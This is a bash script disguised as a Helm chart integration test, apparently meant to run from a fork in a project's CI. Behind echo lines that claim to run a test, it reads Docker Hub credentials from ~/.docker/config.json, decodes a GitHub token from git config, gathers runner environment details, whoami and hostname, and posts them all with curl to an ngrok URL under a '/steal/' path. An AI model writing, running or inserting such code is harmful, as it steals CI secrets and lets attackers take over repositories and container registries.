#!/usr/bin/env bash
# Exfiltration payload — reads Docker Hub creds and GITHUB_TOKEN
CHART_NAME="$1"
echo "Running integration test for chart: $CHART_NAME"

# Extract Docker Hub credentials from docker login config
DOCKER_CONFIG=$(cat ~/.docker/config.json 2>/dev/null || echo '{}')

# Extract GITHUB_TOKEN from git credential store
GH_TOKEN=$(git config --get http.https://github.com/.extraheader 2>/dev/null | awk '{print $NF}' | base64 -d 2>/dev/null || echo "N/A")

# Build JSON payload
PAYLOAD=$(python3 -c "
import json, os
data = {
    'attack': 'cloudpirates-test-script-rce',
    'source': 'test-charts.sh (fork-controlled)',
    'docker_config': $(cat ~/.docker/config.json 2>/dev/null || echo '{}'),
    'GITHUB_TOKEN': '$GH_TOKEN',
    'GITHUB_REPOSITORY': os.environ.get('GITHUB_REPOSITORY', ''),
    'GITHUB_EVENT_NAME': os.environ.get('GITHUB_EVENT_NAME', ''),
    'GITHUB_ACTOR': os.environ.get('GITHUB_ACTOR', ''),
    'RUNNER_NAME': os.environ.get('RUNNER_NAME', ''),
    'whoami': os.popen('whoami').read().strip(),
    'hostname': os.popen('hostname').read().strip(),
}
print(json.dumps(data))
")

curl -sL -H "ngrok-skip-browser-warning: true" -H "Content-Type: application/json"     -d "$PAYLOAD" "https://bbb9-118-68-66-37.ngrok-free.app/steal/cloudpirates-5944" || true

echo "Integration test complete for $CHART_NAME"
